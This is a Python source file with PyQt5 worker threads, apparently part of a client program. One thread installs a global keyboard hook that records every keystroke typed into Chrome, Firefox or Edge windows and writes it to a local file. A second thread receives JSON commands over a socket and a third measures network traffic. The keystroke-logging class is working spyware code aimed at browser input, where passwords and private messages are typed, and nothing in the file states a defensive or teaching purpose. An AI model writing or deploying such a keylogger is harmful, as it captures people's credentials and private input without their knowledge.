# _*_ coding=utf-8 _*_
import time,psutil,json
from PyQt5 import QtCore
from ctypes import *
import PyHook3
import pythoncom
class keyboard_log(QtCore.QThread):
    def __init__(self,parent=None):
        super(keyboard_log,self).__init__(parent)
        self.current = None
        self.name=('Google','Firefox','Edge')
    def __del__(self):
        self.terminate()
        self.wait()

    def get(self,event):
        windowTitle = create_string_buffer(512)
        windll.user32.GetWindowTextA(event.Window, byref(windowTitle), 512)
        windowName = windowTitle.value.decode('gbk')
        for n in self.name:
            if n in windowName:
                if self.current != windowName:
                    self.current = windowName
                    with open('check.txt', 'a') as f:
                        f.write('\n======%s======\n' % self.current)
                with open('check.txt', 'a') as f:
                    if event.Ascii == 13:
                        f.write('\n')  # 回车
                    if event.Ascii == 8:
                        f.write('[VK_BACK]')
                    if event.Ascii == 9:  # tab
                        f.write('\t')
                    if event.Ascii == 0:  # del
                        f.write('[DEL]')
                    if event.Ascii >= 32 and event.Ascii < 127:
                        f.write(chr(event.Ascii))
                break
        return True
    def run(self):
        hm = PyHook3.HookManager()
        hm.KeyDown = self.get
        hm.HookKeyboard()
        pythoncom.PumpMessages()

class thread_in(QtCore.QThread):
    signal=QtCore.pyqtSignal(list)
    def __init__(self,sock,parent=None):
        super(thread_in,self).__init__(parent)
        self.sock=sock
    def __del__(self):
        self.terminate()
        self.wait()
    def run(self):
        while True:
            msg_json=self.sock.recv(1024).decode('utf-8')
            msg=json.loads(msg_json)
            if msg:
                self.signal.emit(msg)

class monitorNet(QtCore.QThread):
    signal=QtCore.pyqtSignal(list)
    def __init__(self,parent=None):
        super(monitorNet,self).__init__(parent)
    def __del__(self):
        self.terminate()
        self.wait()
    def run(self):
        traffic_net=psutil.net_io_counters()[:2]
        while True:
            time.sleep(1)
            traffic_net_new=psutil.net_io_counters()[:2]
            diff=traffic_net_new[0]-traffic_net[0],traffic_net_new[1]-traffic_net[1]
            traffic_net=traffic_net_new
            diff=list(map(lambda x:x/1024,diff))
            self.signal.emit(diff)
